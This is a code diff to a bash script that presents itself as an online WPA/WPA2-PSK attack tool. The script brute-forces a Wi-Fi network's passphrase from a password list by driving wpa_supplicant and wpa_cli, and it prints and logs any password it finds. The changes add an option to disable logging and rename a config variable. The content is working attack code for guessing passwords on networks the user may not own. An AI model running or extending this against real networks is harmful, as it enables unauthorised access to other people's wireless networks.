@@ -23,11 +23,12 @@ echo '
  |_|  |_| |\___/|_|_| |_|_|_|   
        _/ |                     
       |__/                      
-                             v1.1
+
+Online Attacking tool for WPA/WPA2-PSK - v1.1.
 '
 ### input & variables ###
 
-loc=/tmp/wpa_supplicant.conf
+config=/tmp/wpa_supplicant.conf
 
 echo -n "Wireless Interface (e.g. wlan0): "
 read int
@@ -61,12 +62,22 @@ if [ -f "$logfile" ];then
   exit 1
 fi
 
+if [ -z "$logfile" ];then
+  disable_logging=1
+fi
+
 time=$(getTime)
 
 echo ""
 echo -e "${blue}[-]${nc} Attacking SSID:$ssid"
 echo -e "${blue}[-]${nc} Passwordlist: $list" 
-echo -e "${blue}[-]${nc} Logfile is: $logfile" 
+
+if [ -z "$disable_logging" ];then
+  echo -e "${blue}[-]${nc} Logfile is: $logfile" 
+  else
+  echo -e "${red}[x]${nc} Logging is disabled!"
+fi
+
 echo -e "${blue}[-]${nc} Attack started at: $time" 
 
 psk=$(cat $list)
@@ -80,7 +91,7 @@ function killSup {
 
 function prepConf {
 	echo -e "${blue}[-]${nc} Prepping wpa_supplicant.conf"
-	echo ctrl_interface=/var/run/wpa_supplicant > $loc
+	echo ctrl_interface=/var/run/wpa_supplicant > $config
 }
 
 function prepSup {
@@ -90,7 +101,7 @@ function prepSup {
 	else
 		driver='wext'
 	fi
-	wpa_supplicant -B -D${driver} -i${int} -c$loc > /dev/null 2>&1
+	wpa_supplicant -B -D${driver} -i${int} -c$config > /dev/null 2>&1
 	pid=$(ps aux | grep [D]${driver} | awk '{ print $2 }')
 	echo -e "${blue}[-]${nc} Daemonising wpa_supplicant (PID "$pid")"
 }
@@ -127,7 +138,11 @@ function mainGuess {
 			netStatus=$(wpa_cli -i${int} status | grep wpa_state | cut -d"=" -f2)
 			if [ "$netStatus" == "COMPLETED" ]; then
 				echo -e "${green}[+] PASSWORD FOUND: ${nc}$ssid: $psk"
-                                echo "SSID:${nc}ssid,PASSWORD:$psk" >> $logfile
+
+				if [ -z "$disable_logging" ];then					
+                                  echo "SSID:${nc}ssid,PASSWORD:$psk" >> $logfile
+                                fi
+
  				echo ""
 				echo -e "${blue}[-]${nc} Attack finished at: ".$(getTime)
 				return
@@ -141,7 +156,7 @@ function cleanUp {
 	echo -e "${blue}[-]${nc} Cleaning up..."
 	killall wpa_supplicant > /dev/null 2>&1
 	killall wpa_cli > /dev/null 2>&1
-	rm $loc > /dev/null 2>&1
+	rm $config > /dev/null 2>&1
 }
 
 # Added:
